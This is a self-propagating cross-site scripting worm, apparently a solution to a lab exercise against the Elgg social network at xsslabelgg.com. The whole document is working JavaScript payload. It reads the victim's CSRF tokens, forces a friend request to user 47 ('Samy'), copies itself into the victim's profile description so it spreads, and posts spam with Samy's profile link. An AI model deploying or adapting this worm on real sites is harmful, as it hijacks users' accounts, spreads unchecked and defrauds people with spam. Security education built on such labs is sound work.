<script id="worm" type="text/javascript">
	var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
	var jsCode = document.getElementById("worm").innerHTML;
	var tailTag = "</" + "script>";
	var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
	
window.onload = function () {
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	
	//Adding Samy as a friend	
	if(elgg.session.user.guid!=47)	{
		var Ajax=null;
		//Construct the HTTP request to add Samy as a friend.
		//This is the form of request sent when user adds Samy as friend	
		var sendurl="/action/friends/add?friend=47"+ts+token;
	
		//Create and send Ajax request to add friend
		Ajax=new XMLHttpRequest();
		Ajax.open("GET",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
		//For matching the request headers
		Ajax.setRequestHeader("Accept","application/json,text/javascript,*/*;q=0.01");
		Ajax.setRequestHeader("X-Requested-With","XMLHttpRequest");
		Ajax.send();

	}

	//Url for editing profile
	var sendurl="/action/profile/edit"; //FILL IN
	//Filling wormCode in about me
	var content= "guid="+elgg.session.user.guid + token+ts+"&description="+wormCode;

if(elgg.session.user.guid!=47){		
	//Create and send Ajax request to modify profile
	var Ajax2=null;
	Ajax2=new XMLHttpRequest();
	Ajax2.open("POST",sendurl,true);	
	Ajax2.setRequestHeader("Host","www.xsslabelgg.com");
	Ajax2.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
	Ajax2.setRequestHeader("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
	Ajax2.send(content);

}

	//Url for adding a post in thewire
        var sendurl="/action/thewire/add"; //FILL IN
	//Constructing contents with post content
	var content="guid="+elgg.session.user.guid + token + ts+"&body=To+earn+12+USD/Hour(!),+visit+now+"
	content = content+"http://www.xsslabelgg.com/profile/samy";//adding profile link of Samy

	if(elgg.session.user.guid!=47)
	{
		//Create and send Ajax request to modify profile
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);	
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
		Ajax.setRequestHeader("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
		Ajax.send(content);
	}

}
</script>
